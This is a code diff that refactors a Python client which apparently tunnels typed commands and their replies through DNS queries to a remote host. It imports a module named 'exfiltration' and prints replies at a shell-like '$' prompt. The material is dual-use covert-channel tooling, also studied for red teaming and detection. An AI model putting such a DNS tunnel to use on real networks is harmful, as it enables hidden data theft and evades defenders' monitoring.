@@ -1,16 +1,14 @@
 #!/usr/bin/env python3
 # coding: utf-8
 
-import dns      # dns.py
 import sys
 import dnslib
 import socket
 import timeit
 import binascii
 import argparse
-
-DEBUG = None
-BUFFER_SIZE = 1024
+import constants as cn
+import exfiltration as exf
 
 class Client():
     def __init__(self, host, port, timeout=30):
@@ -27,7 +25,7 @@ class Client():
             sock.connect(self.addr)
             sock.send(data)
 
-            response = sock.recv(dns.BUFFER_SIZE)
+            response = sock.recv(cn.SOCK_BUFFER_SIZE)
             if not response:
                 raise Exception('Sending a request successfully failed!')
             return response
@@ -36,15 +34,15 @@ class Client():
         try:
             while True:    
                 text = str.encode(input("> "))
-                data = dns.dns_to_q(text, 'google.com', 'A')
+                data = exf.dns_to_q(text, 'google.com', 'A')
 
                 response = None
-                if (len(data) > dns.BIG_DNS):
+                if (len(data) > cn.MAX_MSG_LEN):
                     response = self.send(data, socket.SOCK_STREAM)
                 else:
                     response = self.send(data, socket.SOCK_DGRAM)
                 
-                response = dns.dns_from_q(response)
+                response = exf.dns_from_q(response)
 
                 print("$", response.decode())
                 
